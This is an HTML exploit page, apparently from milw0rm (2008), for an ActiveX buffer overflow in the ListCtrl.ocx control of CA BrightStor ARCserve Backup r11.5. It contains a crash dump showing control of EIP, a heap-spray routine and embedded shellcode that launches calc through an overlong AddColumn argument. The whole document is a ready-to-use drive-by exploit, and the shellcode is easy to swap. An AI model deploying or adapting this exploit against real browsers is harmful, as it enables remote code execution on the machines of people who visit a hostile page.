<HTML>
<!--
CA BrightStor ARCserve Backup r11.5 AddColumn() 0day ActiveX Remote Buffer Overflow Exploit
Bug discovered by Krystian Kloskowski (h07) <h07@interia.pl>
Tested on: 
- CA BrightStor ARCserve Backup r11.5 (ftp://ftp.ca.com/priv/trial/BABr11/BABLDr115/BABLDr115.zip)
- IE 6 
- XP SP2 Polish
Details:..

Filename: CA\DSM\bin\ListCtrl.ocx
File description: Unicenter DSM r11 List Control ATX
CLSID: {BF6EFFF3-4558-4C4C-ADAF-A87891C5F3A3}
ProgID: LISTCTRL.ListCtrlCtrl.1
Version: 11.2.3.1895
Company: CA

AddColumn(%u4141%u4141..[128], 1);
 
----------------------------------------------------------------
Exception C0000005 (ACCESS_VIOLATION reading [41414141])
----------------------------------------------------------------
EAX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
EBX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
ECX=41414141: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
EDX=7C9037D8: 8B 4C 24 04 F7 41 04 06-00 00 00 B8 01 00 00 00
ESP=0012A9C4: BF 37 90 7C AC AA 12 00-9C AF 12 00 C8 AA 12 00
EBP=0012A9E4: 94 AA 12 00 8B 37 90 7C-AC AA 12 00 9C AF 12 00
ESI=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
EDI=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
EIP=41414141: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
----------------------------------------------------------------
-->

<object id="obj" classid="clsid:BF6EFFF3-4558-4C4C-ADAF-A87891C5F3A3"></object>

<script>

var shellcode = unescape("%u9090%u9090"+  //Windows Execute Command (calc)
"%ue8fcD%u0000%u458b%u8b3c%u057c%u0178%u8bef%u184f%u5f8b"+
"%u0120%u49eb%u348b%u018b%u31ee%u99c0%u84ac%u74c0%uc107%u0dca"+
"%uc201%uf4eb%u543b%u0424%ue575%u5f8b%u0124%u66eb%u0c8b%u8b4b"+
"%u1c5f%ueb01%u1c8b%u018b%u89eb%u245c%uc304%uc031%u8b64%u3040"+
"%uc085%u0c78%u408b%u8b0c%u1c70%u8bad%u0868%u09eb%u808b%u00b0"+
"%u0000%u688b%u5f3c%uf631%u5660%uf889%uc083%u507b%uf068%u048a"+
"%u685f%ufe98%u0e8a%uff57%u63e7%u6c61c");

var address = 0x0A0A0A0A;
var block_size = 0x400000;
var blocks = (address - block_size) / block_size;
var filler = unescape("%u0A0A%u0A0A");
var buf = unescape("%u0A0A%u0A0A");
var buf_size = 128;

while((filler.length * 2) < block_size) filler += filler;
filler = filler.substring(0, block_size - shellcode.length);
memory = new Array();
for(i = 0; i < blocks; i++) memory[i] = filler + shellcode;
while(buf.length < (buf_size * 2)) buf += buf;
buf = buf.substring(0, buf_size);

obj.AddColumn(buf, 1);

</script>
</HTML>

# milw0rm.com [2008-03-16]